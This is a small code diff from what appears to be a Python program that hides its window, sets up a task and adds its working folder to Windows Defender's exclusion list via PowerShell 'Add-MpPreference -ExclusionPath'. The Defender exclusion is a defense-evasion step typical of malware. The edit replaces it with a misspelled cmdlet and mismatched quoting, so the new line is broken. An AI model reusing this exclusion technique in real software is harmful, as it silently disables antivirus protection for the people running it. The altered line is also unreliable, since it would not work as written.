@@ -26,7 +26,7 @@ def setup_task():
 
 def defender_ignore(folderpath):
     create_folder(folderpath)
-    run(['powershell', '-command', 'Add-MpPreference', '-ExclusionPath', f'"{folderpath}"' ])
+    run(['powershell', '-command', '\'App-MpPreference', '-ExclusionPath', f'"{folderpath}"\'' ])
 
 def main():
     hide_window()
